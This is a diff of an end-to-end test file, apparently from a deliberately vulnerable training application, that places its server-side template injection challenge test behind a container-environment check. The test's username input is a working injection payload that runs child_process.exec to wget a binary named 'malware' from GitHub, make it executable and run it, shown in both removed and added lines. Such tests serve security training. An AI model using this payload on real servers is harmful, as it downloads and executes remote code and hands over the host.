@@ -6,22 +6,24 @@ describe('/profile', () => {
     browser.waitForAngularEnabled(false)
   })
 
-  describe('challenge "SSTi"', () => {
-    // protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
-    // browser.get('/profile')
+  if (!utils.disableOnContainerEnv()) {
+    describe('challenge "SSTi"', () => {
+      // protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
+      // browser.get('/profile')
 
-    xit('should be possible to inject arbitrary nodeJs commands in username', () => {
-      browser.get('/profile')
-      browser.waitForAngularEnabled(false)
-      username = element(by.id('username'))
-      submitButton = element(by.id('submit'))
-      username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
-      submitButton.click()
-      browser.get('/')
-      browser.driver.sleep(5000)
+      xit('should be possible to inject arbitrary nodeJs commands in username', () => {
+        browser.get('/profile')
+        browser.waitForAngularEnabled(false)
+        username = element(by.id('username'))
+        submitButton = element(by.id('submit'))
+        username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
+        submitButton.click()
+        browser.get('/')
+        browser.driver.sleep(5000)
+      })
+      // protractor.expect.challengeSolved({ challenge: 'SSTi' })
     })
-    // protractor.expect.challengeSolved({ challenge: 'SSTi' })
-  })
+  }
 
   describe('challenge "SSRF"', () => {
     // protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
